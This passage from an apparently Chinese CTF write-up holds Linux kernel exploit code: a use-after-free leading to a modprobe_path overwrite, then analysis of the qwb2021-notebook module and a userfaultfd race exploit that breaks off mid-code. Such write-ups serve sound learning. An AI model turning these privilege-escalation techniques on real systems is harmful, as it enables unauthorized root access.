ROOT_SCRIPT_PATH);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* construct UAF */</span></span><br><span class="line">    data.ptr = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    data.offset = <span class="number">0</span>;</span><br><span class="line">    data.length = <span class="number">0x50</span>;</span><br><span class="line">    <span class="built_in">memset</span>(data.ptr, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    allocBuf(dev_fd[<span class="number">0</span>], &amp;data);</span><br><span class="line">    editBuf(dev_fd[<span class="number">0</span>], &amp;data);</span><br><span class="line">    close(dev_fd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* leak kernel heap addr and guess the page_offset_base */</span></span><br><span class="line">    readBuf(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    kernel_heap_leak = data.ptr[<span class="number">0</span>];</span><br><span class="line">    page_offset_base = kernel_heap_leak &amp; <span class="number">0xfffffffff0000000</span>;<span class="comment">//直接映射区的后28位一般是0</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel heap leak: 0x%lx\n&quot;</span>, kernel_heap_leak);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] GUESSING page_offset_base: 0x%lx\n&quot;</span>, page_offset_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* try to alloc fake chunk at (page_offset_base + 0x9d000 - 0x10) */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] leaking kernel base...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    data.ptr[<span class="number">0</span>] = page_offset_base + <span class="number">0x9d000</span> - <span class="number">0x10</span>;</span><br><span class="line">    data.offset = <span class="number">0</span>;</span><br><span class="line">    data.length = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    editBuf(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    allocBuf(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    allocBuf(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line"></span><br><span class="line">    data.length = <span class="number">0x40</span>;</span><br><span class="line">    readBuf(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    <span class="keyword">if</span> ((data.ptr[<span class="number">2</span>] &amp; <span class="number">0xfff</span>) != <span class="number">0x30</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] invalid data leak: 0x%lx\n&quot;</span>, data.ptr[<span class="number">2</span>]);</span><br><span class="line">        errExit(<span class="string">&quot;\033[31m\033[1m[x] FAILED TO HIT page_offset_base! TRY AGAIN!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_base = data.ptr[<span class="number">2</span>] - <span class="number">0x30</span>;</span><br><span class="line">    kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base:\033[0m 0x%lx\n&quot;</span>, kernel_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel offset:\033[0m 0x%lx\n&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the modprobe_path, we&#x27;ll let it requesting new slub page for it */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking modprobe_path...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    allocBuf(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    close(dev_fd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    data.ptr[<span class="number">0</span>] = kernel_offset + MODPROBE_PATH - <span class="number">0x10</span>;</span><br><span class="line">    data.offset = <span class="number">0</span>;</span><br><span class="line">    data.length = <span class="number">0x8</span>;</span><br><span class="line"></span><br><span class="line">    editBuf(dev_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line">    allocBuf(dev_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line">    allocBuf(dev_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span> *) &amp;data.ptr[<span class="number">2</span>], ROOT_SCRIPT_PATH);</span><br><span class="line">    data.length = <span class="number">0x30</span>;</span><br><span class="line">    editBuf(dev_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* trigger the fake modprobe_path */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigerring fake modprobe_path...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /home/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/home/fake&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read flag */</span></span><br><span class="line">    <span class="built_in">memset</span>(flag, <span class="number">0</span>, <span class="keyword">sizeof</span>(flag));</span><br><span class="line"></span><br><span class="line">    flag_fd = open(<span class="string">&quot;/flag&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (flag_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to chmod flag!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    read(flag_fd, flag, <span class="keyword">sizeof</span>(flag));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got flag: \033[0m%s\n&quot;</span>, flag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="qwb2021-notebook"><a href="#qwb2021-notebook" class="headerlink" title="qwb2021-notebook"></a>qwb2021-notebook</h1><p>启动脚本<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">stty</span> intr ^]</span><br><span class="line"><span class="built_in">exec</span> <span class="built_in">timeout</span> 300 qemu-system-x86_64 -m 64M -kernel bzImage -initrd rootfs.cpio -append <span class="string">&quot;loglevel=3 console=ttyS0 oops=panic panic=1 kaslr&quot;</span> -nographic -net user -net nic -device e1000 -smp cores=2,threads=2 -cpu kvm64,+smep,+smap -monitor /dev/null 2&gt;/dev/null -s</span><br></pre></td></tr></table></figure></p><p>可以看到开启了smep,smap以及kaslr</p><p>此外内部还可以发现开启了kpti</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /sys/devices/system/cpu/vulnerabil</span><br><span class="line">ities/*</span><br><span class="line">Mitigation: PTI</span><br><span class="line">Mitigation: __user pointer sanitization</span><br><span class="line">Mitigation: Full generic retpolin</span><br></pre></td></tr></table></figure><p>再看init脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">/bin/mount -t devtmpfs devtmpfs /dev</span><br><span class="line"><span class="built_in">chown</span> root:<span class="built_in">tty</span> /dev/console</span><br><span class="line"><span class="built_in">chown</span> root:<span class="built_in">tty</span> /dev/ptmx</span><br><span class="line"><span class="built_in">chown</span> root:<span class="built_in">tty</span> /dev/tty</span><br><span class="line"><span class="built_in">mkdir</span> -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line"></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"></span><br><span class="line">ifup eth0 &gt; /dev/null 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">insmod notebook.ko</span><br><span class="line"><span class="built_in">cat</span> /proc/modules | grep notebook &gt; /tmp/moduleaddr</span><br><span class="line"><span class="built_in">chmod</span> 777 /tmp/moduleaddr</span><br><span class="line"><span class="built_in">chmod</span> 777 /dev/notebook</span><br><span class="line">poweroff -d 300 -f &amp;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Welcome to QWB!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh</span></span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 1 -n -f</span><br></pre></td></tr></table></figure><p>重点便是notebook.ko</p><p>静态分析,设备文件初始化了read,write,ioctl这几个操作</p><p>主要漏洞在于ioctl菜单中存在一个edit功能</p><p>其允许调用kreallloc进行重新分配object,而当新的size大于旧的size时便会释放原先的obj</p><p>且下方存在一个copy_from_user这就为利用userfaultfd完成条件竞争提供了条件</p><p>这里选择利用tty设备文件完成利用</p><p>其实这题有其他不少解法,这里以学习userfaultfd的利用为主</p><p><strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_STRUCT_SZIE 0x2E0</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> work_for_cpu_fn_off = <span class="number">0xffffffff8949eb90</span> - <span class="number">0xffffffff8a28e440</span>;</span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred_off = <span class="number">0xffffffffa14a9ef0</span> - <span class="number">0xffffffffa228e440</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds_off = <span class="number">0xffffffffa14a9b40</span> - <span class="number">0xffffffffa228e440</span>;</span><br><span class="line"><span class="type">size_t</span> kernel_base;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">userarg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">size_t</span> idx;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">void</span>* buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> note_fd;</span><br><span class="line"><span class="type">void</span>* stuck_mapped_memory;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ErrExit</span><span class="params">(<span class="type">char</span>* err_msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">RegisterUserfault</span><span class="params">(<span class="type">void</span> *fault_page, <span class="type">void</span>* handler)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features    = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="type">unsigned</span> <span class="type">long</span>)fault_page; <span class="comment">//我们要监视的区域</span></span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>) <span class="comment">//注册缺页错误处理，当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作</span></span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="comment">//开一个线程，接收错误的信号，然后处理</span></span><br><span class="line">    <span class="type">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>,handler, (<span class="type">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">noteadd</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span>* buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">notearg</span>;</span></span><br><span class="line">    notearg.idx = idx;</span><br><span class="line">    notearg.size = size;</span><br><span class="line">    notearg.buf = buf;</span><br><span class="line">    ioctl(note_fd, <span class="number">0x100</span>, &amp;notearg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">notegift</span><span class="params">(<span class="type">void</span>* buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">notearg</span>;</span></span><br><span class="line">    notearg.idx = <span class="number">0</span>;</span><br><span class="line">    notearg.size = <span class="number">0</span>;</span><br><span class="line">    notearg.buf = buf;</span><br><span class="line">    ioctl(note_fd, <span class="number">0x64</span>, &amp;notearg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">notedel</span><span class="params">(<span class="type">size_t</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">notearg</span>;</span></span><br><span class="line">    notearg.idx = idx;</span><br><span class="line">    notearg.size = <span class="number">0</span>;</span><br><span class="line">    notearg.buf = <span class="literal">NULL</span>;</span><br><span class="line">    ioctl(note_fd, <span class="number">0x200</span>, &amp;notearg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">noteedit</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span>* buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">notearg</span>;</span></span><br><span class="line">    notearg.idx = idx;</span><br><span class="line">    notearg.size = size;</span><br><span class="line">    notearg.buf = buf;</span><br><span class="line">    ioctl(note_fd, <span class="number">0x300</span>, &amp;notearg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">OpenNote</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    note_fd = open(<span class="string">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (note_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] err in open notebook device&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">userfaultfd_sleep3_handler</span><span class="params">(<span class="type">void</span>* arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> uffd = (<span class="type">unsigned</span> <span class="type">long</span>) arg;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] sleep3 handler created&quot;</span>);</span><br><span class="line">    <span class="type">int</span> nready;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] sleep3 handler unblocked&quot;</span>);</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* page = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="comment">// init page</span></span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    uc.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] sleep3 handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">userfaultfd_stuck_handler</span><span class="params">(<span class="type">void</span>* arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> uffd = (<span class="type">unsigned</span> <span class="type">long</span>) arg;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] stuck handler created&quot;</span>);</span><br><span class="line">    <span class="type">int</span> nready;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] stuck handler unblocked&quot;</span>);</span><br><span class="line">    pause();</span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* page = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span 